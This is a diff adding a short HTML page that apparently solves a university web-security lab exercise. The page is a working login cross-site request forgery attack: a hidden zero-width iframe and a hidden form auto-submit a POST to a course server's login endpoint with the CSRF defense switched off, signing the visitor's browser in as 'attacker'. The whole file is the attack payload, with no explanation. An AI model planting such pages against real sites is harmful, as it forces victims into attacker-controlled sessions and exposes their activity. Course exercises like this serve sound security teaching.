@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+    <head>
+
+    </head>
+    <body>
+        <iframe name='csrf1' style="border:none" width=0 height= 0> </iframe>
+        <form id='csrf1form' method='POST' action='http://trurl.cs.illinois.edu/login?csrfdefense=0&xssdefense=5' target='csrf1' hidden>
+        	<input name='username' value='attacker'/>
+        	<input name='password' value='l33th4x'/>
+        </form>
+    </body>
+
+
+    <script>
+    	document.getElementById('csrf1form').submit()
+    </script>
+
+</html>
